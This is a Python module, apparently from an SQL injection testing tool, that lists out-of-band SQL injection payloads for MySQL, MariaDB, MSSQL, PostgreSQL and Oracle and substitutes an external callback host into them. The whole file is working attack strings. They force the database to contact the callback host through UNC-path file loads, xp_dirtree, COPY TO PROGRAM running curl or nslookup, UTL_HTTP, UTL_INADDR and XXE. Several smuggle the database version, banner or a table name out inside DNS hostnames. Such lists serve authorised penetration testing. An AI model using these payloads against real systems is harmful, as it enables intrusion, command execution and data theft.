# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Out-of-band (OOB) payloads.
"""
from __future__ import annotations

import urllib.parse
from typing import List

# ---------------------------------------------------------------------------
# OOB payloads (require external callback URL)
# Placeholder: {callback} is the interactsh/burp collaborator domain
# ---------------------------------------------------------------------------

OOB_PAYLOADS: dict[str, List[str]] = {
    "mysql": [
        # DNS lookup (triggers DNS resolution of the callback hostname)
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{callback}','\\\\a'))--",
        "' AND (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,'{callback}',0x5c61)))--",
        # DNS lookup + data exfiltration (VERSION() embedded in subdomain)
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.{callback}\\\\a'))--",
        "' AND (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e,'{callback}',0x5c61)))--",
    ],
    "mariadb": [
        # MariaDB supports the same LOAD_FILE UNC-path DNS trick as MySQL
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{callback}','\\\\a'))--",
        # DNS + data exfiltration
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.{callback}\\\\a'))--",
    ],
    "mssql": [
        # DNS lookup
        "'; EXEC master..xp_dirtree '//{callback}/a'--",
        "'; EXEC master..xp_fileexist '//{callback}/a'--",
        # DNS lookup + data exfiltration (@@version embedded in UNC path hostname)
        "'; DECLARE @v varchar(1024);SET @v=(SELECT @@version);EXEC('master..xp_dirtree \"//'+@v+'.{callback}/a\"')--",
        "'; DECLARE @p varchar(1024);SET @p=(SELECT TOP 1 table_name FROM information_schema.tables);EXEC('master..xp_dirtree \"//'+@p+'.{callback}/a\"')--",
    ],
    "postgres": [
        # DNS lookup via dblink
        "' AND (SELECT dblink_send_query('host={callback}','SELECT 1'))--",
        # DNS lookup via COPY/curl
        "'; COPY (SELECT '') TO PROGRAM 'nslookup {callback}'--",
        # DNS lookup + data exfiltration (version embedded in curl URL subdomain)
        "'; DO $$DECLARE c text; BEGIN SELECT version() INTO c; EXECUTE 'COPY (SELECT '''') TO PROGRAM ''curl http://''||c||''.{callback}'''; END$$--",
        # Simpler exfil using dblink with data in host
        "'; CREATE OR REPLACE FUNCTION f() RETURNS void AS $f$ DECLARE v text; BEGIN SELECT version() INTO v; PERFORM dblink_send_query(''host=''||v||''.{callback}'',''SELECT 1''); END; $f$ LANGUAGE plpgsql; SELECT f()--",
    ],
    "sqlite": [],  # SQLite has no native OOB capability
    "oracle": [
        # DNS lookup
        "' UNION SELECT UTL_HTTP.REQUEST('http://{callback}/') FROM dual-- -",
        "' AND 1=(SELECT UTL_HTTP.REQUEST('http://{callback}/') FROM dual)-- -",
        # DNS lookup + data exfiltration (banner/version embedded in URL)
        "' UNION SELECT UTL_HTTP.REQUEST('http://'||(SELECT UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(banner))) FROM v$version WHERE rownum=1)||'.{callback}/') FROM dual-- -",
        # Simpler exfil via UTL_INADDR DNS lookup with data in hostname
        "' AND 1=(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)||'.{callback}') FROM dual)-- -",
        # XXE-based DNS lookup (unpatched Oracle)
        "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{callback}/\"> %remote;]>'),'/l') FROM dual-- -",
    ],
    "auto": [
        "'; EXEC master..xp_dirtree '//{callback}/a'--",
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.{callback}\\\\a'))--",
        "'; COPY (SELECT '') TO PROGRAM 'nslookup {callback}'--",
        "' AND 1=(SELECT UTL_HTTP.REQUEST('http://{callback}/') FROM dual)-- -",
    ],
}


def get_oob_payloads(dbms: str, callback: str) -> List[str]:
    """Return OOB payloads with {callback} substituted."""
    # Extract just the hostname from the callback URL for DNS payloads
    parsed = urllib.parse.urlparse(callback)
    hostname = parsed.netloc or parsed.path or callback
    raw = OOB_PAYLOADS.get(dbms, OOB_PAYLOADS["auto"])
    return [p.format(callback=hostname) for p in raw]
